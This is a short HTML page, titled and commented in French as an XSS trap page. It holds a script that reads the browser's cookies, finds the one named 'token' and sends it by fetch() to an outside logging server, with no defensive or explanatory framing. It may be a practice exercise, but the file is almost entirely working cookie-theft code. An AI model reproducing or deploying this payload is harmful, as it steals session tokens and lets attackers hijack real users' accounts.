<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>XSS Piège</title></head>
<body>
<script>
  // Récupérer le token dans les cookies
  function getToken() {
    const cookies = document.cookie.split('; ');
    for (const cookie of cookies) {
      const [name, value] = cookie.split('=');
      if (name === 'token') {
        return value;
      }
    }
    return null;
  }

  const token = getToken();

  if (token) {
    // Envoyer le token au serveur
    fetch("https://xss-server.onrender.com/log?token=" + encodeURIComponent(token))
      .then(() => console.log("Token envoyé au serveur"));
  } else {
    console.log("Pas de token dans les cookies");
  }
</script>
<h1>Page piégée XSS</h1>
</body>
</html>
